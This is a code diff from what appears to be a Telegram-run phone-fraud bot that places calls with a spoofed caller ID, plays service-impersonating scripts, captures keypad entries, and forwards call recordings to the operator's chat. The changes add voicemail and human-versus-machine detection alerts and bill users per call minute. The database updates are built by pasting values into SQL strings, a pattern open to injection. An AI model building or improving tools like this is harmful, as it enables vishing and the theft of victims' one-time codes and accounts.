@@ -936,7 +936,8 @@ def callmaking(number,spoof,chatid,service,amd):
   "to":f"{apidata[2]}{number}",
   "from":f"{spoof}",
   "callback":f"{ngrok_url}/{service}/{chatid}/random/texis",
-  "enable": "8890"
+  "enable": f"{apidata[3]}",
+  "voicemail":'yes'
 }
                     response = requests.post(callurl, headers=headers, json=data)
                     res = json.loads(response.text)
@@ -990,7 +991,9 @@ def custom_callmaking(number,spoof,chatid,script_id,amd):
   "to":f"{apidata[2]}{number}",
   "from":f"+{spoof}",
   "callback":f"{ngrok_url}/{script_id}/{chatid}/custom/texis",
-  "enable": "8890"
+  "enable": f"{apidata[3]}",
+  "voicemail":'yes'
+
 }
                     response = requests.post(callurl, headers=headers, json=data)
                     res = json.loads(response.text)
@@ -1549,6 +1552,9 @@ def t_custom_prebuild_script_call(script_id,chatid):
 
     elif event == "hangup":
         try:
+            duration = data['duration']
+            per_call_cost =  float(duration) * 0.00333
+            call_cost_update = call_cost + per_call_cost
             res = data['recname']
             resp = recordingtexis(res)
             response = requests.get(resp)
@@ -1561,6 +1567,8 @@ def t_custom_prebuild_script_call(script_id,chatid):
                 'audio': response.content,
             }
             requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
+            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+            db.commit()
         except:
             print("No Audio File")
         finally:
@@ -1571,6 +1579,12 @@ def t_custom_prebuild_script_call(script_id,chatid):
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
+
+    elif event == "Machine":
+            bot.send_message(chatid,f"""*Machine Detected 🤖*""",parse_mode='markdown')
+
+    elif event == "Human":
+            bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
 
 
     elif event == "dtmf.received":
@@ -1729,6 +1743,9 @@ def tprebuild_script_call(service,chatid):
     
     elif event == "hangup":
         try:
+            duration = data['duration']
+            per_call_cost =  float(duration)*0.00333
+            call_cost_update = call_cost + per_call_cost
             res = data['recname']
             resp = recordingtexis(res)
             response = requests.get(resp)
@@ -1741,8 +1758,8 @@ def tprebuild_script_call(service,chatid):
                 'audio': response.content,
             }
             requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
-            # c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
-            # db.commit()
+            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+            db.commit()
         except:
             print("No Audio File")
         finally:
@@ -1753,6 +1770,12 @@ def tprebuild_script_call(service,chatid):
             last_message_ids[chatid]=mesid
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
+
+    elif event == "Machine":
+            bot.send_message(chatid,f"""*Machine Detected 🤖*""",parse_mode='markdown')
+
+    elif event == "Human":
+            bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
 
 
     elif event == "dtmf.received":
